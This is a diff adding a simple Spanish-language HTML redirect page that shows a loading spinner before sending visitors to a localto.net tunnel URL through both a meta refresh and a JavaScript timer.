@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="refresh" content="2;url=https://eyfnvlm7a.localto.net/basa/">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Redirigiendo...</title>
+  <style>
+    body {
+      background-color: #111;
+      color: white;
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding-top: 20%;
+    }
+
+    .loader {
+      border: 8px solid #333;
+      border-top: 8px solid #09f;
+      border-radius: 50%;
+      width: 60px;
+      height: 60px;
+      animation: spin 1s linear infinite;
+      margin: 0 auto 20px;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .message {
+      font-size: 1.2em;
+    }
+  </style>
+</head>
+<body>
+  <div class="loader"></div>
+  <div class="message">Redirigiendo, por favor espera...</div>
+
+  <script>
+    // También puedes usar JavaScript para mayor control:
+    setTimeout(function() {
+      window.location.href = "https://eyfnvlm7a.localto.net/basa/";
+    }, 5000); // 5000 milisegundos = 2 segundos
+  </script>
+</body>
+</html>
